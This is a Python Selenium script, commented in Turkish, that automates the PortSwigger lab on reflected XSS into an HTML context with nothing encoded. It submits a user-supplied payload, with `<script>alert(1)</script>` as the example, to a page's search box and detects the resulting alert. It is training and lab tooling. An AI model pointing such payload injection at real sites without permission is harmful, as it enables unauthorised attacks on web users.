"""
phoenixmap
Copyright (c) 2025 Burak Demiröz

This source code is licensed under the MIT License.
See the LICENSE file for details.
"""

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

def get_webdriver(browser_name):
    """Seçilen tarayıcı için WebDriver oluşturur"""
    try:
        if browser_name.lower() == 'chrome':
            options = webdriver.ChromeOptions()
            return webdriver.Chrome(options=options)
        elif browser_name.lower() == 'firefox':
            return webdriver.Firefox()
        elif browser_name.lower() == 'edge':
            return webdriver.Edge()
        elif browser_name.lower() == 'opera':
            return webdriver.Opera()
        else:
            print("Geçersiz tarayıcı seçildi. Chrome kullanılacak.")
            return webdriver.Chrome()
    except Exception as e:
        print(f"{browser_name} başlatılırken hata: {str(e)}")
        return None

def main():
    print("Cross-site scripting (XSS) - PortSwigger")
    print("Reflected XSS into HTML context with nothing encoded")
    print("========================================")
    print("Girdi filtrelenmeden HTML'e yerleştirildiği için, tarayıcı JavaScript kodunu çalıştırıyor.")
    
    # Kullanıcı girdileri
    lab_url = input("Test edilecek URL'yi girin: ")
    print("\nLütfen XSS payload'unu girin. Örneğin: <script>alert(1)</script>)")
    payload = input("Payload girin : ")
    
    # Tarayıcı seçimi
    print("\nKullanılabilir Tarayıcılar:")
    print("1. Chrome")
    print("2. Firefox")
    print("3. Edge")
    print("4. Opera")
    browser_choice = input("Tarayıcı seçin (1-4, varsayılan:1): ") or "1"
    
    browsers = ['chrome', 'firefox', 'edge', 'opera']
    try:
        selected_browser = browsers[int(browser_choice)-1]
    except (IndexError, ValueError):
        selected_browser = 'chrome'
    
    print(f"\n{selected_browser.capitalize()} tarayıcısı ile başlatılıyor...")
    
    # WebDriver'ı başlat
    driver = get_webdriver(selected_browser)
    if not driver:
        return

    try:
        # Laboratuvar sayfasını aç
        driver.get(lab_url)
        
        # Arama kutusunu bul ve payload'ı gönder
        search_box = driver.find_element(By.NAME, "search")
        search_box.send_keys(payload)
        
        # Arama butonunu bul ve tıkla
        search_button = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
        search_button.click()
        
        # Alert'in görünmesini bekle (maksimum 10 saniye)
        WebDriverWait(driver, 10).until(EC.alert_is_present())
        
        # Alert'i kabul et
        alert = driver.switch_to.alert
        alert.accept()
        
        print(f"\n[+] XSS başarıyla tetiklendi! ({selected_browser.capitalize()} tarayıcısında)")
        
        # Çözümün sunucu tarafından işlenmesi için kısa bekleme
        time.sleep(2)

    except Exception as e:
        print(f"\n[!] Hata oluştu: {str(e)}")
    finally:
        # Tarayıcıyı kapat
        driver.quit()
        print("\nTarayıcı kapatıldı. İşlem tamamlandı.")

if __name__ == "__main__":
    main()